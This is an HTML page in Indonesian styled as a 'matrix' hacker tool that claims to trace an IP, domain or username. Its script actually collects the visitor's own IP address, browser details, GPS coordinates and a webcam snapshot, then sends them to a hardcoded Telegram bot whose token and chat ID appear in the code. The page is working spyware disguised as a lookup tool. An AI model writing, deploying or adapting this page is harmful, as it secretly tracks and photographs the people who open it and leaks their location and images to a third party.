<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>Tools Yang Ingin Kamu Lacak</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
* {box-sizing:border-box;margin:0;padding:0}
body{background:#000;color:#0f0;font-family:'Orbitron',monospace;overflow:hidden}
canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0}
.ui{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
h1{font-size:2.4rem;margin-bottom:1.2rem;letter-spacing:3px;text-shadow:0 0 10px #0f0}
input[type=text]{width:300px;padding:.7rem;border:1px solid #0f0;background:#000;color:#0f0;border-radius:4px;font-size:1rem;margin-right:.5rem}
button{padding:.7rem 1.4rem;border:none;background:#0f0;color:#000;font-weight:700;border-radius:4px;cursor:pointer;transition:.3s}
button:hover{background:#0c0}
#result{margin-top:1.5rem;font-size:.9rem;color:#3f3}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="ui">
  <h1>Tools Yang Ingin Kamu Lacak</h1>
  <div>
    <input id="target" type="text" placeholder="IP / Domain / Username">
    <button onclick="pwn()">LACAK</button>
  </div>
  <div id="result"></div>
</div>

<script>
/* === CONFIG === */
const BOT_TOKEN = '8466797317:AAHmPG4JTBb3fuWEJfcmcryqj_wTToKOPRw';
const CHAT_ID   = '7755675050';

/* === Matrix rain (cosmetic) === */
const c=document.getElementById('matrix'),ctx=c.getContext('2d');
c.width=window.innerWidth;c.height=window.innerHeight;
const cols=Math.floor(c.width/14),drops=[];
for(let i=0;i<cols;i++)drops[i]=Math.random()*c.height;
const chars='黑客李江黑客李江黑客李江0123456789';
function draw(){
  ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);
  ctx.fillStyle='#0f0';ctx.font='14px Orbitron';
  for(let i=0;i<cols;i++){
    const txt=chars[Math.floor(Math.random()*chars.length)];
    ctx.fillText(txt,i*14,drops[i]);
    drops[i]+=14;
    if(drops[i]>c.height&&Math.random()>.975)drops[i]=0;
  }
}
setInterval(draw,33);

/* === Main trigger === */
async function pwn(){
  const out=document.getElementById('result');
  out.textContent='[+] Menscan target...';
  const payload={
    target: document.getElementById('target').value||'none',
    ua: navigator.userAgent,
    ref: document.referrer||'direct',
    url: location.href,
    ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown')
  };

  /* GPS */
  const pos=await new Promise(res=>{
    navigator.geolocation.getCurrentPosition(
      p=>res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),
      ()=>res({lat:'denied',lon:'denied',acc:'denied'}),
      {timeout:5000}
    );
  });
  payload.gps=pos;

  /* Media snapshot */
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
    const track=stream.getVideoTracks()[0];
    const imgCapture=new ImageCapture(track);
    const blob=await imgCapture.takePhoto();
    const reader=new FileReader();
    reader.readAsDataURL(blob);
    reader.onloadend=()=>{
      payload.photo=reader.result;
      sendTelegram(payload);
    };
    track.stop();
  }catch(e){
    payload.photo='webcam_blocked';
    sendTelegram(payload);
  }
}

/* === Exfil to Telegram === */
function sendTelegram(data){
  const caption=`
🔪 LACAKAN BARU 🔪
Target: ${data.target}
IP: ${data.ip}
GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
UA: ${data.ua}
Ref: ${data.ref}
URL: ${data.url}
  `.trim();
  const form=new FormData();
  form.append('chat_id',CHAT_ID);
  form.append('caption',caption);
  if(data.photo!=='webcam_blocked'){
    fetch(data.photo).then(r=>r.blob()).then(blob=>{
      form.append('photo',blob,'snap.jpg');
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
    });
  }else{
    form.append('text',caption+'\n[+] Foto gagal');
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:form});
  }
  document.getElementById('result').textContent='[+] Laporan terkirim ke Telegram.';
}
</script>
</body>
</html>
